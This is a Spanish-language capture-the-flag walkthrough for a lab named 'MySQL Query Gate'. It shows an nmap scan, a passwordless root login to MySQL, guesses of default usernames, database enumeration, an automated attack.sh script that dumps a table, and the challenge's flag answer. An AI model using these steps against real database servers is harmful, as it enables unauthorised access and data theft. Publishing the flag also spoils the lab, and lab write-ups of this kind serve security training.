# MySQL Query Gate

## 🎯 Objetivo
Acceder a MySQL sin contraseña y encontrar el nickname del hacker ético: **h4ckv1s3r**

## Pasos

### 1. Reconocimiento (30 segundos)
```bash
nmap -sV <TARGET_IP>
```
**Buscar**: Puerto 3306 MySQL abierto

### 2. Acceso Directo (15 segundos)
```bash
mysql -h <TARGET_IP> -u root
```
**¡Sin contraseña!** - Acceso root directo

### 3. Enumeración de Bases de Datos (10 segundos)
```sql
SHOW DATABASES;
```
**Buscar**: Base de datos `detective_inspector`

### 4. Seleccionar Base de Datos (5 segundos)
```sql
USE detective_inspector;
```

### 5. Ver Tablas (5 segundos)
```sql
SHOW TABLES;
```
**Encontrar**: Tabla `hacker_list`

### 6. Extraer Datos y FLAG (10 segundos)
```sql
SELECT * FROM hacker_list;
```
**RESULTADO**: Nickname **h4ckv1s3r** ✅

## 🚀 Secuencia Completa One-Shot

```bash
# Todo en una línea
mysql -h <TARGET_IP> -u root -e "SHOW DATABASES; USE detective_inspector; SHOW TABLES; SELECT * FROM hacker_list;"
```

## 🔍 Comandos de Verificación Rápida

```sql
-- Verificar acceso
SELECT USER();
SELECT VERSION();

-- Info de la tabla
DESCRIBE hacker_list;

-- Buscar nickname específico
SELECT * FROM hacker_list WHERE nickname LIKE '%h4ck%';
```

## 💡 Troubleshooting Rápido

**Si falla la conexión root:**
```bash
mysql -h <TARGET_IP> -u admin
mysql -h <TARGET_IP> -u mysql
mysql -h <TARGET_IP> -u test
```

**Verificar puerto:**
```bash
nmap -p 3306 <TARGET_IP>
nc -zv <TARGET_IP> 3306
```

## 📋 Script de Automatización

```bash
#!/bin/bash
IP=$1
echo "=== Attacking MySQL Query Gate ==="
echo "Target: $IP"
echo ""

# Ejecutar todo de una vez
mysql -h $IP -u root << EOF
SHOW DATABASES;
USE detective_inspector;
SHOW TABLES;
SELECT * FROM hacker_list;
EOF

echo ""
echo "=== FLAG SHOULD APPEAR ABOVE ==="
```

**Uso:**
```bash
chmod +x attack.sh
./attack.sh <TARGET_IP>
```

## ⏱️ Tiempo Total: ~1.5 minutos

1. **Nmap**: 30 seg
2. **MySQL Login**: 15 seg  
3. **DB Enum**: 30 seg
4. **Flag Extract**: 15 seg
5. **FLAG ENCONTRADA**: **h4ckv1s3r** ✅

## 🎭 Comandos Extra (Opcional)

```sql
-- Ver estructura completa
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'detective_inspector';

-- Contar registros
SELECT COUNT(*) FROM hacker_list;

-- Solo el nickname
SELECT nickname FROM hacker_list;

-- Info del sistema
SELECT @@hostname;
SELECT @@version;
```

## 🛡️ Fallos

**Error común**: `Access denied`
- **Solución**: Probar usuarios alternativos o puerto diferente

**Error**: `Unknown database`  
- **Solución**: Verificar nombre exacto con `SHOW DATABASES;`

**Error**: `Table doesn't exist`
- **Solución**: Usar `SHOW TABLES;` para listar correctamente
